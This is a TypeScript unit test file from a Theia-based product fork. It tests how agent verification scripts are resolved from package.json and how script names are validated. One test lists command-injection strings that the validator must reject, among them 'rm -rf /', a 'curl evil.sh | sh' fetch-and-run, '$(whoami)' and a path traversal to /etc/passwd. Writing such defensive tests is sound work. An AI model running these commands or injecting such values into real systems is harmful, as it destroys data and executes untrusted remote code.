// *****************************************************************************
// Copyright (C) 2026 Theia contributors and Qaap product fork.
// SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-only WITH Classpath-exception-2.0
// *****************************************************************************

import { expect } from 'chai';
import { isQaapVerificationScriptName, resolveQaapAgentVerificationScripts, resolveQaapDeclaredVerificationScript } from './qaap-agent-verification';

describe('resolveQaapAgentVerificationScripts', () => {

    it('selects the first typecheck variant before build test and lint', () => {
        expect(resolveQaapAgentVerificationScripts({
            scripts: {
                tsc: 'tsc --noEmit',
                'type-check': 'tsc -p tsconfig.json',
                typecheck: 'tsc',
                lint: 'eslint .',
                test: 'mocha',
                build: 'vite build',
            },
        })).to.deep.equal(['typecheck', 'build', 'test', 'lint']);
    });

    it('falls back through typecheck aliases and omits missing scripts', () => {
        expect(resolveQaapAgentVerificationScripts({
            scripts: {
                tsc: 'tsc --noEmit',
                test: 'mocha',
            },
        })).to.deep.equal(['tsc', 'test']);
    });

    it('skips manifests without supported scripts', () => {
        expect(resolveQaapAgentVerificationScripts({ scripts: { start: 'vite' } })).to.deep.equal([]);
        expect(resolveQaapAgentVerificationScripts({})).to.deep.equal([]);
        expect(resolveQaapAgentVerificationScripts(undefined)).to.deep.equal([]);
    });
});

describe('resolveQaapDeclaredVerificationScript', () => {
    const packageJson = { scripts: { test: 'node test.js', 'test:e2e': 'node e2e.js' } };

    it('accepts a script the repository actually declares', () => {
        expect(resolveQaapDeclaredVerificationScript(packageJson, 'test')).to.equal('test');
        expect(resolveQaapDeclaredVerificationScript(packageJson, 'test:e2e')).to.equal('test:e2e');
    });

    it('never lets a success check become a command', () => {
        // The check arrives over HTTP. It is a NAME looked up in package.json, and the runner
        // invokes it as `npm run <name>` through execFile — so anything shell-shaped is refused
        // here, before it could reach a process.
        for (const attack of ['test; rm -rf /', 'test && curl evil.sh | sh', '$(whoami)', '../../etc/passwd', 'test\nrm -rf /']) {
            expect(resolveQaapDeclaredVerificationScript(packageJson, attack), attack).to.equal(undefined);
            expect(isQaapVerificationScriptName(attack), attack).to.equal(false);
        }
    });

    it('falls back rather than verifying nothing when the name is unknown', () => {
        expect(resolveQaapDeclaredVerificationScript(packageJson, 'nope')).to.equal(undefined);
        expect(resolveQaapDeclaredVerificationScript(undefined, 'test')).to.equal(undefined);
        expect(resolveQaapDeclaredVerificationScript(packageJson, undefined)).to.equal(undefined);
    });
});
